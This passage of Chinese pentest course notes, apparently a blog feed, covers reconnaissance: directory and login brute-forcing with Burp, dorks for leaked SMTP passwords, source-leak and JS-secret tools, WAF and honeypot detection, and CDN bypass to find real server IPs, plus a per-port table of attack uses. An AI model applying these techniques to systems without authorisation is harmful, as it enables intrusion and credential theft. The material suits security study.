文件夹存在判断：返回403表示文件夹存在但无索引文件；若文件夹下有默认索引文件（如index.php），则返回200。
重定向判断：30X状态码可能表示文件存在触发跳转，也可能是不存在时的容错跳转，需结合具体情况分析。

burp进行目录爆破方法

操作流程

抓取目标网站请求包
在路径末尾添加变量标记（如§）
载入路径字典文件（包含_system、user等常见路径）
设置5个并发线程进行扫描


结果分析：通过对比状态码（200&#x2F;403&#x2F;404）识别有效路径，如index.php返回200表示存在


 登录爆破技术

双重验证机制：发现系统同时验证明文密码和MD5加密密码，两者需同时正确才能登录

爆破技巧

使用Burp的Payload Processing功能自动生成MD5值
通过状态码差异判断（302跳转为成功，500为失败）
实际测试发现只需加密密码正确即可绕过验证


实战验证：通过修改数据包中的password_md5字段为已知MD5值成功登录


]]></content>
      <categories>
        <category>网络安全</category>
        <category>小迪安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>小迪安全</tag>
      </tags>
  </entry>
  <entry>
    <title>小迪安全--信息打点(2)</title>
    <url>/posts/dba72746.html</url>
    <content><![CDATA[业务资产查询平台：



小蓝本
https://www.xiaolanben.com/



爱企查
https://aiqicha.baidu.com/


业务类型
WEB 应用 2. APP 应用 3. PC 端应用 4. 小程序应用 5. 微信公众号 6. 其他产品等
Web应用工具大全
[~]#棱角 ::Edge.Forum
主要资产内容

WEB 应用 2. APP 应用 3. PC 端应用 4. 小程序应用 5. 微信公众号 6. 其他产品等

查询工具：



名称
地址



天眼查
https://www.tianyancha.com/


小蓝本
https://www.xiaolanben.com/


爱企查
https://aiqicha.baidu.com/


企查查
https://www.qcc.com/


国外企查
https://opencorporates.com/


启信宝
https://www.qixin.com/


查询重点

业务方向：网站、APP、PC端应用、小程序、微信公众号等
知识产权：域名、商标、专利等
关联企业：分公司、子公司等关联企业信息

公众号信息



名称
地址



搜狗微信搜索
https://weixin.sogou.com/


Web单域名
备案信息 2. 企业产权 3. 注册域名 4. 反查解析

备案信息


名称
地址



备案信息查询
http://www.beianx.cn/


备案管理系统
https://beian.miit.gov.cn/


查询备案信息方法：

通过业务资产方法查询到的备案信息
备案信息查询
门户网站最底部

未备案的域名无法进行查询
注册域名


名称
地址



域名注册查询
https://buy.cloud.tencent.com/domain


备案信息查询
https://beian.miit.gov.cn/


查询内容

目标企业注册的所有域名
域名注册时间、到期时间
域名持有人信息

IP 反查根据获取到的IP进行反向查询域名信息



名称
地址



IP 反查域名
https://x.threatbook.cn/


IP 反查域名
http://dns.bugscaner.com/


Web子域名
DNS 数据 2. 证书查询 3. 网络空间 4. 威胁情报 5. 枚举解析

DNS 数据


名称
地址



dnsdumpster
https://dnsdumpster.com/


证书查询


名称
地址



CertificateSearch
https://crt.sh/


网络空间


名称
地址



FOFA
https://fofa.info/


全球鹰
http://hunter.qianxin.com/


360
https://quake.360.cn/quake/


钟馗之眼
https://www.zoomeye.org/


零零信安
https://0.zone/


Shodan
https://www.shodan.io/


Censys
https://censys.io/


ONYPHE
https://www.onyphe.io/


FullHunt
https://fullhunt.io/


Soall Search Engine
https://soall.org/


Netlas
https://app.netlas.io/responses/


Leakix
https://leakix.net/


DorkSearch
https://dorksearch.com/


威胁情报


名称
地址



微步在线 情报社区
https://x.threatbook.cn/


奇安信 威胁情报中心
https://ti.qianxin.com/


360 威胁情报中心
https://ti.360.cn/#/homepage


VirusTotal 在线查杀平台
https://www.virustotal.com/gui/


VenusEye 威胁情报中心
https://www.venuseye.com.cn/


绿盟科技 威胁情报云
https://ti.nsfocus.com/


IBM 情报中心
https://exchange.xforce.ibmcloud.com/


天际友盟安全智能平台
https://redqueen.tj-un.com


华为安全中心平台
https://isecurity.huawei.com/sec


安恒威胁情报中心
https://ti.dbappsecurity.com.cn/


AlienVault
https://otx.alienvault.com/


深信服
https://sec.sangfor.com.cn/


丁爸情报分析师的工具箱
http://dingba.top/


听风者情报源 start.me
https://start.me/p/X20Apn


GreyNoise Visualizer
https://viz.greynoise.io/


URLhaus 数据库
https://urlhaus.abuse.ch/browse/


Pithus
https://beta.pithus.org/


枚举解析


名称
地址



在线子域名查询
http://tools.bugscaner.com/subdomain/


DNSGrep 子域名查询
https://www.dnsgrep.cn/subdomain


工具强大的子域名收集器
https://github.com/shmilylty/OneForAll


Web 架构资产
程序语言 2. 框架源码 3. 搭建平台 4. 数据库类 5. 操作系统

指纹识别


名称
地址



在线 cms 指纹识别
http://whatweb.bugscaner.com/look/


Wappalyzer
https://github.com/AliasIO/wappalyzer


TideFinger 潮汐
http://finger.tidesec.net/


云悉指纹
https://www.yunsee.cn/


WhatWeb
https://github.com/urbanadventurer/WhatWeb


数字观星 Finger-P
https://fp.shuziguanxing.com/#/


特殊场景当web服务器是内网环境如何进行识别呢？
​	在线指纹识别平台是无法使用的，只能使用工具进行测试
GitHub - newbe3three&#x2F;gotoscan: 由Go语言实现的一款CMS指纹识别工具。
使用方法：

gotoscan.exe -host https://localhost.com 
gotoscan.exe -hosts hosts.txt

框架源码开源源码
利用指纹识别找到CMS
官网下载

闭源源码源码泄露#后端-闭源-配置不当-源码泄漏
参考：https://www.secpulse.com/archives/124398.html 
敏感目录文件扫描
​	CVS：https://github.com/kost/dvcs-ripper
​	GIT：https://github.com/lijiejie/GitHack
​	SVN：https://github.com/callmefeifei/SvnHack
​	DS_Store：https://github.com/lijiejie/ds_store_exp

.git泄露
通过web站点扫描工具，扫到.git
使用githack进一步获取源码


.svn泄露
通过web站点扫描工具，扫到.svn
使用svnhacker进一步获取源码


.ds_store泄露
通过web站点扫描工具，扫到.ds_store
使用Dump all（源码泄露集成工具）


网站压缩文件
直接下载


composer文件泄露（php特有）
composer.josn就像是一个网站说明性文件，里面可能会包括源码



码云资源搜索1、提取特征关键文件
​	如网站的js文件名、脚本文件名
2、进行信息搜索（通过浏览网站页面获取）
​	查看是否存在QQ号、邮箱地址、作者名、关键注释信息
3、对收集的信息进行搜索
​	使用git、gitee、oschina
google hacking使用-改进版 | 逐梦
GITHUB资源搜索：
​	in:name test               #仓库标题搜索含有关键字
​	in:descripton test         #仓库描述搜索含有关键字
​	in:readme test             #Readme文件搜素含有关键字
​	stars:&gt;3000 test           #stars数量大于3000的搜索关键字
​	stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键字 
​	forks:&gt;1000 test           #forks数量大于1000的搜索关键字
​	forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字 
​	size:&gt;&#x3D;5000 test           #指定仓库大于5000k(5M)的搜索关键字 
​	pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字 
​	created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字 
​	user:test                  #用户名搜素
​	license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字 
​	language:java test         #在java语言的代码中搜索关键字
​	user:test in:name test     #组合搜索,用户名test的标题含有test的
关键字配合谷歌搜索：
​	site:Github.com smtp  
​	site:Github.com smtp @qq.com  
​	site:Github.com smtp @126.com  
​	site:Github.com smtp @163.com  
​	site:Github.com smtp @sina.com.cn
​	site:Github.com smtp password
​	site:Github.com String password smtp
黑产源码
菲博源码网 - 菲博源码网-免费源码,棋牌源码,源码交易,交易平台,网站源码,源码下载
互站网 - 国内知名的网站、域名、软件、APP源码交易平台
棋牌卡牌 桌游 游戏源码 免费下载 - 爱给网

JS信息收集与后端语言的差异
​	后端语言：php、java、python、.NET 浏览器段看不到真实的源代码
​	前端语言：JS和JS框架 浏览器段可以看到真实的源代码
识别方法

使用插件wappalyer
源代码简短
引入多个js文件（关注admin.js、login.js）
一般有&#x2F;static&#x2F;js&#x2F;app.js等顺序的js文件
一般有cookie中有connect.sid

PHP等后端应用：Wappalyzer显示主要语言为PHP，JS仅作为辅助库，十有八九不是JS前端架构
纯前端应用：编程语言显示为JavaScript，框架显示Vue&#x2F;React等
常见框架
Vue、NodeJS、jQuery、Angular等
存在的安全隐患

源代码泄露
未授权访问（js里面分析更多的url地址确定接口路径）
敏感key泄露（js文件中可能配置了接口信息如云应用、短信、邮箱、数据库等）
API接口安全（代码中加密提交的参数传递，更多的URL路径）

测试方法人工测试浏览器：

打开浏览器开发者工具（F12）
切换到Network面板筛选JS文件
重点分析包含关键字的文件（如login&#x2F;admin）
使用Ctrl+Shift+F全局搜索接口路径

全局搜索关键字：

src&#x3D;
path&#x3D;
method:”get”
http.get(“
method:”post”
http.post(“
$.ajax
http://service.httppost
http://service.httpget

Burp插件收集HaE：https://github.com/gh0stkey/HaE    通过规则库正则匹配数据包中的敏感数据，并高亮展示匹配到的数据包。
BurpAPIFinder：https://github.com/shuanx/BurpAPIFinder    JS敏感信息匹配插件，且据作者说信息匹配除正则外还支持多种模式，集成了HaE、APIKit等敏感信息指纹等。
​	依据其配置文件规则匹配，听说该插件支持递归扫描、深入挖掘，因此能获取到更多的信息。不过缺点就是，扫描速度慢，刷新时内存占用高。
自动化工具收集浏览器插件 → FindSomething    该插件会收集当前标签页源码&amp;JS链接，并将收集到的JS链接再次加载以获取JS源码，随后从获取到的html&amp;js源码中通过正则匹配其中的敏感信息并展示。
JSFinder：https://github.com/Threezh1/JSFinder    依据正则检索Web js文件中的URL、子域名等信息。
URLFinder：https://github.com/pingc0y/URLFinder    作者说由于JSFinder项目长时间无人维护，因此自己写了一个。项目较新，检索速度快&amp;内容多，对于自动化工具JS信息收集，更推荐该项目。	相较于JSFinder，使用URLFinder获取到的信息除URL&amp;子域名外，还有各种经规则匹配的敏感信息。
ffuf：https://github.com/ffuf/ffuf    使用模糊测试的方法，通过大字典去跑目标Web可能存在的JS文件，主要针对部分JS文件可能存在但并未被发送至客户端的情况，从而获取更多信息。    其实就跟目录扫描差不多，只不过这里扫的全是js文件罢了。由于使用ffuf需要提前准备字典，字典网站：https://wordlists.assetnote.io/
Packer-Fuzzer：https://github.com/rtcatc/Packer-Fuzzer    由于WebPack会自动将打包后的JS代码进行混淆，导致上述JS信息收集方式收集到的信息不那么准确，因此针对WebPack站点，建议使用对口工具。Packer-Fuzzer，主要目标为WebPack站点，针对被打包的JS文件进行敏感信息收集，且支持部分漏洞检测，扫描完成后会自动生成检测报告。
​	该项目会先将整个WebPack打包文件拖下来，再对拖下来的文件内容进行收集敏感信息，最后给出报告。因此实际中使用该工具跑一遍站点速度较慢。
jjjjjjjjjjjjjs：https://github.com/ttstormxx/jjjjjjjjjjjjjs针对WebPack站点的敏感信息收集工具。相较于Packer-Fuzzer，该项目仅匹配JS文件中的敏感信息，而不会拖取被打包文件
框架组件识别框架能快速判断目标系统是否存在已知漏洞
PHP开发框架
​	ThinkPHP、Laravel、Yii
Python开发框架
​	Django和Flask
Java开发框架

常见Web容器: Tomcat、JBoss、Jetty等是Java Web开发中常用的Web容器
数据库组件: Hibernate、MyBatis、MySQL、Oracle、SQL Server、PostgreSQL、MongoDB等是Java常用的数据库相关组件
缓存数据库: Redis是Java中常用的缓存数据库
消息队列: Kafka、RabbitMQ等消息队列组件
其他功能组件: 包括负载均衡、分布式数据库、日志收集、搜索类、系统监控、分库分表、微服务等各类功能组件

Java组件	

日志记录组件: Log4j、Logback、SLF4J等，用于实现日志记录功能

安全认证组件: JWT、Shiro等，用于用户认证和权限管理

文件处理组件: POI用于处理Office文件，PDFBox用于处理PDF文件

数据解析组件: Jackson、Fastjson、Gson等，用于JSON数据解析


Web开发三种模型

基础模型：完全手写功能代码，无框架和组件依赖（风险较高–&gt;常规代码审计）
以框架为核心实现功能（内置安全防护，漏洞可预测—&gt;历史漏洞利用）
框架+第三方组件（可能存在历史、版本漏洞—&gt;框架+组件组合测试）

Python框架Django识别识别方法

插件工具识别（如Wappalyzer）
数据包特征：Set-Cookie字段包含CSRF token等特定字段
管理页面路径通常包含”&#x2F;admin”
返回包头常见”X-Powered-By: Django”
页面底部可能显示”Django site admin”

Flask识别识别方法

数据包特征：ETag字段包含flask
插件工具识别（如Wappalyzer）
错误页面可能会显示Flask调试信息

不是所有Flask应用都会暴露框架信息
PHP框架
插件直接识别ThinkPHP框架
返回包头包含”X-Powered-By: ThinkPHP”
特定错误页面样式
favicon.ico图标特征







这些固定特征通常出现在Cookie、响应头或HTML源代码中：

Laravel- 包含”laravel_session”、”XSRF-TOKEN”等关键字- Set-Cookie: 含有XSRF-TOKEN、laravel_seesion等关键字
Yii
Set-Cookie: 包含”YII_CSRF_TOKEN”、”yii”等关键字


ThinkPHP
包含特定格式的Cookie或响应头



JAVA识别识别方法

通过数据包特征识别（如remember me字段识别Shiro）
通过URL后缀识别（如.do、.action识别Struts）
通过默认页面&#x2F;图标识别（如Spring Boot的默认错误页面和图标）
通过端口识别（如Solr默认端口8983）

FastJson&#x2F;Jackson在提交Json数据包中修改测试：
—FastJson组件会将01解析为1      F：  id：01 正常
—Jackson组件在解析01时会抛出异常    J： id：01 报错
Shiro（验证用户身份的组件）请求包的cookie中存在rememberMe字段
返回包中存在set-cookie：rememberMe&#x3D;deleteMe
请求包中存在rememberMe&#x3D;X时，响应包中存在rememberMe&#x3D;deleteMe
有时服务器不会主动返回rememberMe&#x3D;deleteMe，直接发包即可，将cookie内容改为rememberMe&#x3D;1，若响应包中有rememberMe&#x3D;deleteMe，基本可以确定网站是apache shiro搭建的
Struts2使用Struts2框架后后缀一般带do或action
Springboot1、通过web应用程序网页标签的小绿叶图标识别
2、通过Springboot框架默认的报错页面识别
Solr一般开放8983端口，访问页面也可以探针到
其他思路1、使用CMS识别到源码体系TP开发
​	用cms进行识别，如识别出来是api admin但小程序核心仍然是ThinkPHP。
2、使用工具扫描
3、使用空间测绘搜索相关图标信息识别


WAF防火墙定义: Web应用防火墙（Web Application Firewall，简称WAF），是专门保护Web应用的安全防护系统。
核心功能

保护Web应用免受攻击
阻止常规攻击手段

类比说明: 类似于电脑杀毒软件，但专门针对Web应用而非主机安全
保护范围

仅保护Web应用层面
不保护主机渗透、数据库渗透等非Web应用攻击

WAF分类
云WAF
由云服务商提供（如腾讯云、阿里云、华为云、百度云、亚马逊云等）
集成在云产品中，用户不可见
有免费版和收费版


硬件WAF
由安全公司研发的专用硬件设备（如深信服、绿盟、永信至诚、知道创宇等）
部署在客户机房
升级可能需要更换设备


软件WAF
可下载安装的软件（如D盾、安全狗、宝塔等）
直接安装在服务器上


代码级WAF
通过代码实现的过滤规则
集成在网站源代码中



WAF识别识别方法

拦截页面识别：通过观察网站拦截页面特征进行人工判断，不同WAF产品有独特的拦截界面样式
工具识别：使用自动化工具（如wafw00f）进行检测，支持国内外84种常见WAF产品的识别
网络空间测绘：通过搜索引擎查询目标网站使用的安全产品信息

工具识别WAFW00F
GitHub - EnableSecurity&#x2F;wafw00f: WAFW00F allows one to identify and fingerprint Web Application Firewall (WAF) products protecting a website.
检测命令：
进入waf00f文件夹：python main.py 目标URL
支持列表：工具内置支持阿里云WAF、安全狗、华为云WAF、腾讯云WAF等国内外主流产品
IdentYwaf
GitHub - stamparm&#x2F;identYwaf: Blind WAF identification tool
检测命令
Usage: python identYwaf.py [options] &lt;host|url&gt;
空间测绘平台工作原理: 通过爬取互联网设备信息建立数据库
360网络空间测绘 — 因为看见，所以安全
网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统
鹰图平台(hunter)-奇安信网络空间测绘系统
蜜罐系统常见蜜罐系统

AMUN IMAP蜜罐
DIONAEA HTTP&#x2F;SMBD&#x2F;MSSQL&#x2F;Memcached&#x2F;FTP蜜罐
HONEYPY HTTP&#x2F;ES蜜罐
KIPPO SSH蜜罐
HFISH蜜罐管理后台
CONPOTS7工业控制系统蜜罐
ELASTICSEARCH蜜罐
WEBLOGIC蜜罐等

本质：一种安全威胁检测技术，通过引诱和欺骗攻击者来记录其攻击手段
核心目的

刻画攻击者画像
还原攻击手法
实现时间消耗战术

分类标准：基于交互程度等级

低交互蜜罐：仅建立单次连接（”简单玩一下就完了”）
中交互蜜罐：提供多阶段交互（”再玩一玩”）
高交互蜜罐：深度持续交互（”很深入的玩，像交朋友一年”）

核心功能

节点管理（可自定义开放端口）
攻击行为记录（包括IP、时间、尝试的凭证等）
实时攻击态势展示（大屏可视化）

攻击模拟

提供虚假登录界面（如admin&#x2F;admin）
记录所有异常访问尝试
生成攻击者指纹信息

识别特征

非常规端口服务（如4433）
过于明显的漏洞暴露
系统响应存在固定模式

蜜罐识别方法浏览器插件识别法Heimdallr 
GitHub - Ghr07h&#x2F;Heimdallr: 一款完全被动监听的谷歌插件，用于高危指纹识别、蜜罐特征告警和拦截、机器特征对抗
Heimdallr是一款致力于被动嗅探浏览器流量，用于提示漏洞框架指纹、告警拦截蜜罐请求、对抗浏览器特征追踪（浏览器持久化、webRTC、Canvas画布等）的Chrome插件。

识别原理：通过检测指纹特征判断是否为蜜罐系统，会显示”敏感信息存在手机号码”等告警提示
准确性问题：存在较高误报率，例如打开微信公众号文章也可能被误判为蜜罐

Quake
GitHub - 360quake&#x2F;quake_rs: Quake Command-Line Application

quake.exe init 【360quake apikey】
quake.exe honeypot 目标


空间测绘识别360网络空间测绘 — 因为看见，所以安全
网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统
鹰图平台(hunter)-奇安信网络空间测绘系统

人工识别
端口特征分析
多端口开放：蜜罐通常会开放大量端口（如80&#x2F;81&#x2F;82等连续端口）
规律性排列：端口号呈现规律性递增（如901&#x2F;902&#x2F;903…）
非标准端口：避免占用常见应用端口，使用非标准端口模拟服务


Web访问特征
协议异常：用HTTP协议访问非Web服务端口（如MySQL的3306）时会出现下载行为
设计原理：蜜罐采用JSONP技术传输攻击者输入的账号密码，导致协议解析异常


设备指纹识别
特定返回值：不同蜜罐产品有固定指纹特征（如SSH蜜罐有特定banner）
产品特征库：需要收集整理各蜜罐产品的指纹特征进行比对



综合判定策略

三重验证法
使用网络空间测绘平台（如夸克、鹰图）初步识别
结合专用工具进行二次验证
最后通过人工分析端口特征、Web行为等确认



CDN绕过CDN基本概念
传统访问模式：用户访问域名→解析服务器IP→直接访问目标主机
CDN访问模式：用户访问域名→CDN节点→真实服务器IP→访问目标主机
WAF防护模式：用户访问域名→CDN节点(WAF防护)→真实服务器IP→访问目标主机

配置方式
CDN配置要素

加速域名：需要启用加速的具体域名（如www.xiaodi8.com）
加速区域：国内&#x2F;海外等不同地区的加速选择
加速类型：静态资源&#x2F;动态资源等不同类型的内容加速

IP差异

传统访问返回真实服务器IP（如47.75.212.15）
CDN访问返回虚拟节点IP（如202.96.134.33）

信息收集失效：端口扫描等主机级信息收集会作用于CDN节点而非真实服务器
业务影响范围：仅影响IP相关资产探测，其他业务数据（如API接口）仍正常交互
CDN判断技术Nslookup
​	Win下使用nslookup命令进行查询，若返回域名解析结果为多个ip，多半使用了CDN，是不真实的ip。
多地ping查询
​	使用不同区域ping，查看ping的ip结果是否唯一。若不唯一，则目标网站可能存在CDN。
查询网站：
https://www.17ce.com/
https://ping.chinaz.com/
使用工具直接查询
查询网站：https://www.ipip.net/ip.html
CDN绕过技术针对子域名未配置CDN、前期未配置过CDN记录
识别方法

子域名查询：通过未加速的子域名获取真实IP
历史记录查询：利用DNS历史解析记录
证书查询：通过SSL证书信息反查

工具推荐

子域名收集：DNSGrep（https://www.dnsgrep.cn）
网络空间测绘：fofa.so、quake.360.cn
备案查询：https://www.yunsee.cn

针对CDN配置的加速域名范围
绕过原理：当加速区域限定为中国内地时，海外访问请求会直连源站
绕过方法

检查历史解析记录（DNS缓存投毒）
利用子域名加速配置缺陷（如bbs.baidu.com未加速）
国外节点请求（部分CDN未部署海外节点）

工具推荐

超级Ping工具：https://ping.chinaz.com/
全球节点检测：https://tools.ipip.net/cdn.php
IP反查接口：https://get-site-ip.com/

子域名入手针对子域名未配置CDN、CDN配置的限定加速域名范围
​	1、有些站点的主站使用了CDN，或者部分域名使用了CDN，某些子域名可能未使用。
​	2、主站可能只配置了中国地区加速，未配置其他地区加速
绕过方法：

使用子域名爆破，查询存在的子域名
使用工具进行检测
超级Ping工具：https://ping.chinaz.com/
全球节点检测：https://tools.ipip.net/cdn.php
子域名收集：DNSGrep（https://www.dnsgrep.cn）
网络空间测绘：fofa.so、quake.360.cn
备案查询：https://www.yunsee.cn



FOFA icon_hash编写python
import mmh3import sysimport requestsimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) def hashico(url):	target=url+&quot;/favicon.ico&quot;	response = requests.get(url=target,verify=False)	favicon = response.content.encode(&#x27;base64&#x27;)	hash = mmh3.hash(favicon)	print(hash)if __name__ == &#x27;__main__&#x27;:	hashico(sys.argv[1])



使用

之后结合fofa快速定位目标相关资产：

利用网站漏洞定义：利用网站存在的功能漏洞（如SSRF），使服务器主动向外发起请求暴露真实IP
典型漏洞

SSRF漏洞：服务器端请求伪造，可强制服务器访问指定URL
远程图片加载：文章发布&#x2F;头像设置等需要加载外部资源的功能

实现原理：构造特殊请求让服务器主动连接攻击者控制的监听服务器，通过访问日志获取真实IP
注意：需要配置web服务器来接收服务器的访问
遗留文件使用web目录结构扫描爆破、获取相关的服务器配置信息文件

调试文件：phpinfo.php（SERVER_ADDR、HTTP_HOST）等包含服务器配置信息的文件
配置文件：web.config、.env等可能包含IP信息的文件
版本说明：README.md、CHANGELOG等开发文档

该方法具有偶然性，依赖管理员未删除调试文件
特殊端口&#x2F;历史记录特殊端口：尝试访问非标准端口（如8080、8443）的服务
查询ip与域名绑定历史记录，可能会发现使用CDN之前的目标ip
历史记录：查找网站早期未使用CDN时的DNS解析记录
查询网站

https://dnsdb.io/zh-cn/
https://x.threatbook.cn/
http://toolbar.netcraft.com/site_report?url=
http://viewdns.info/
http://www.17ce.com/
https://community.riskiq.com/
http://www.crimeflare.com/cfssl.html

邮件系统寻找真实IP的原理：通过邮件系统寻找真实IP主要基于两点：一是邮件服务器通常不做CDN服务；二是邮件通信具有主动发送的特性。
不做CDN的原因

邮件系统使用MX记录类型，而CDN服务通常只支持CNAME记录和A记录
部分厂商不支持MX记录做CDN加速服务

实现方法
被动接收法

触发网站发送邮件的功能（如找回密码、用户注册、邮件订阅等）
查看邮件原文中的Received字段获取发送方IP
示例：通过”忘记密码”功能让网站发送验证邮件

主动发送法

向目标域名的不存在邮箱地址发送邮件
接收退回邮件获取真实IP
注意：此方法需使用自建邮件服务器，第三方邮箱（如QQ）会屏蔽真实IP


有效性验证

发件人邮箱必须使用目标域名（如&#x78;&#120;&#120;&#64;&#x74;&#x61;&#114;&#103;&#101;&#116;&#46;&#x63;&#x6f;&#x6d;）
不能是第三方邮箱服务（如126、QQ等）

IP验证

查看邮件头中的Received字段
确认IP是否属于目标域名所有



国外查询接口通过国外得一些冷门得DNS或IP去请求目标，很多时候国内得CDN对国外得覆盖面并不是很广，故此可以利用此特点进行探测。 通过国外代理访问就能查看真实IP了，或者通过国外的DNS解析，可能就能得到真实的IP查询网站
IP反查接口：https://get-site-ip.com/
https://tools.ipip.net/cdn.php
IP接口合集：https://github.com/ihmily/ip-info-api
全网扫描定义：当常规方法无法获取真实IP时采用的终极手段，通过特殊标识符在全网寻找相似IP节点
成功率：完全取决于扫描范围和精度，属于”没有办法的办法”
类比：与”以量打量”原理相似，都是通过消耗资源来获取真实信息

判断CDN厂商、备案信息
使用纯真IP库进行信息查询（如：阿里云）
使用工具对查询的IP段进行扫描
GitHub - Tai7sy&#x2F;fuckcdn: CDN真实IP扫描，易语言开发
扫描IP段中开放指定端口的设备（详细见github）
访问开放端口验证关键字
保存匹配结果到result.txt





其他工具：
​	https://github.com/Pluto-123/Bypass_cdn
主机架构分析常见服务

常见类型：Apache、Nginx、IIS、lighttpd等
应用服务器：Tomcat、Jboss、Weblogic、Websphere等
数据库服务：Mysql、SqlServer、Oracle、Redis、MongoDB等

web服务器
识别方法
Server字段识别（通过HTTP响应头中的Server字段可以判断服务器类型）

Server: Apache&#x2F;2.4.46 (Win32) OpenSSL&#x2F;1.1.1g mod_fcgid&#x2F;2.3.9a 表示Apache服务器
该方法简单直接，是识别WEB服务器最常用的方式

使用指纹识别工具
应用服务器
​	定义: 应用服务器是中间件的一种特殊类型，主要用于支持特定语言开发的应用程序运行。
​	常见类型: Tomcat、Jboss、Weblogic、Websphere等，这些通常与Java应用相关。
与Web服务器区别

端口特性: 应用服务器安装后会默认开放特定端口（如Tomcat默认8080，Weblogic默认7001），而Web服务器通常使用80&#x2F;443端口。
业务支持: 应用服务器针对特定语言开发的程序（如Java）有更好的支持性，例如Weblogic对Java应用的支持优于IIS。

识别方法

端口扫描: 必须通过端口扫描识别，无法像Web服务器那样通过浏览器返回包判断。
常见端口
7001: Weblogic
8080: Jboss&#x2F;Tomcat
8009: Tomcat AJP协议
9080-9081: Websphere



​	
数据库服务

关系型数据库: MySQL、SQL Server、Oracle等
非关系型数据库: Redis、MongoDB等
渗透测试关注点
MySQL: 注入提权、爆破
Redis: 未授权访问、弱口令爆破
MongoDB: 爆破、未授权访问（默认端口27017）


关键端口服务
22&#x2F;SSH: 爆破、隧道转发
23&#x2F;Telnet: 路由设备弱口令
25&#x2F;SMTP: 邮件伪造
53&#x2F;DNS: 区域传送攻击
80-89&#x2F;Web: 中间件漏洞利用
11211&#x2F;Memcached: 未授权访问



内网环境特征

业务端口部分映射到外网
造成”看到的≠实际的”现象
典型场景：
Web端口80映射成功
数据库端口3306未映射



解决方案

无直接解决办法
需结合其他信息收集手段
重要提示：扫描结果需结合架构分析

端口扫描


端口&#x2F;端口范围
协议
服务&#x2F;用途
渗透测试用途



20,21
TCP
FTP
匿名上传下载、爆破、嗅探、提权（如ProFTPd 1.3.5）、后门利用、中间人攻击（v1）、SSH隧道&#x2F;内网代理、文件传输


22
TCP
SSH
爆破、嗅探、路由&#x2F;交换机弱口令


23
TCP
Telnet
邮件伪造、VRFY&#x2F;EXPN查询用户信息（smtp-user-enum工具）


25
TCP
SMTP
邮件伪造、用户信息枚举


53
TCP&#x2F;UDP
DNS
区域传送漏洞、DNS劫持&#x2F;缓存投毒&#x2F;欺骗、DNS隧道远控


69
TCP&#x2F;UDP
TFTP
配置文件下载


80-89,443,8080-8089
TCP
Web服务
TopN漏洞、VPN&#x2F;OWA&#x2F;Webmail&#x2F;OA漏洞、中间件&#x2F;框架漏洞、Java控制台、Web管理面板、爆破&#x2F;嗅探


110
TCP
POP3
权限配置不当


111,2049
TCP
NFS&#x2F;Samba
爆破、远程执行漏洞（如MS08-067、MS17-010）、嗅探


137,139,445
TCP
SMB
爆破、远程执行漏洞


161
UDP
SNMP
默认团体字符串爆破、内网信息搜集


389
TCP
LDAP
注入攻击、匿名访问、弱口令爆破


512,513,514
TCP
Rexec&#x2F;Rlogin
Linux远程执行、匿名访问


873
TCP
Rsync
未授权访问、文件上传


1194
TCP
OpenVPN
弱口令、信息泄露、爆破


1352
TCP
Lotus
注入、提权


1433
TCP
SQL Server
SA弱口令、爆破、TNS注入、弹Shell


1521
TCP
Oracle
弱口令爆破


1723
TCP
PPTP
爆破、VPN钓鱼


2082,2083
TCP
cPanel
弱口令、未授权访问


2181
TCP
ZooKeeper
默认密码访问


2601,2604
TCP
Zebra
弱口令


3128
TCP
Squid
弱口令、Kangle代理


3306
TCP
MySQL
Shift后门（需Windows 2003以下）、爆破、MS12-020漏洞


3389
TCP
RDP
爆破、MS12-020漏洞


3690
TCP
SVN
SVN泄露、未授权访问


4848
TCP
GlassFish
爆破、注入


5000
TCP
Sybase&#x2F;DB2
爆破、注入、弱口令


5432
TCP
PostgreSQL
弱口令、注入


5900-5902
TCP
VNC
弱口令爆破、未授权命令执行


5984
TCP
CouchDB
未授权访问、弱口令爆破


6379
TCP
Redis
Java反序列化、弱口令


7001,7002
TCP
WebLogic
控制台弱口令、反序列化漏洞


7778
TCP
Kloxo
弱口令


8000
TCP
Ajenti
管理面板漏洞


8009
TCP
Tomcat AJP
AJP协议漏洞（如CVE-2020-1938）


8443
TCP
Plesk
远程执行、SQL注入


8069
TCP
Zabbix
反序列化、控制台弱口令


8080-8089
TCP
Jenkins&#x2F;JBoss&#x2F;WebSphere
反序列化、控制台弱口令


9080-9081,9090
TCP
WebSphere
远程执行漏洞


9200,9300
TCP
ElasticSearch
未授权访问


11211
TCP
Memcached
未授权访问、爆破


27017,27018
TCP
MongoDB
默认未授权访问


50070,50030
TCP
Hadoop
未授权访问、命令执行


收集方式：

主动收集：通过自身工具发送请求并分析返回信息（如Nmap、Masscan）
被动收集：通过第三方平台查询目标信息（如网络空间）

工具分类：目前最常用的三种端口扫描工具是网络空间、Nmap和Masscan
Nmap
基本介绍：老牌安全扫描工具，提供图形化界面（Zenmap）和命令行版本
扫描模式
Intense scan：常规扫描模式
Intense scan plus UDP：扫描所有TCP&#x2F;UDP端口
Intense scan no ping：不带ping的扫描
Quick scan：快速扫描模式
Quick scan plus：增强版快速扫描（最常用）


常用参数
-T4：设置扫描速度
-A：启用操作系统检测和版本检测
-v：显示详细输出
-sV：探测服务版本
-O：操作系统检测


特点：扫描结果全面但耗时较长

扫描状态：

open：服务正在监听该端口
closed：端口可达但无服务监听
filtered：端口被防火墙&#x2F;安全设备阻断

Masscan
编译环境：需要使用Visual Studio进行编译
参考资源
官方下载：https://github.com/robertdavidgraham/masscan


特点：扫描速度极快，适合大规模扫描任务

编译方法：
下载源码：从GitHub下载Masscan的源码。
安装编译器：使用Visual Studio 2019进行编译（其他版本也可，但需自行调整配置）。
配置编译环境

在Source Files-&gt;misc-&gt;string_s.h中添加编译配置，根据编译器版本修改_MSC_VER的值。

选择Release模式编译

点击”生成解决方案”生成exe文件

编译输出：成功编译后在bin目录生成masscan.exe可执行文件


基本语法

masscan -p&lt;端口&gt; &lt;IP&gt;
例：masscan -p80 10.0.0.0&#x2F;8

多端口扫描

支持逗号分隔和范围指定
例：masscan -p80,8000-8100 10.0.0.0&#x2F;8

结果输出

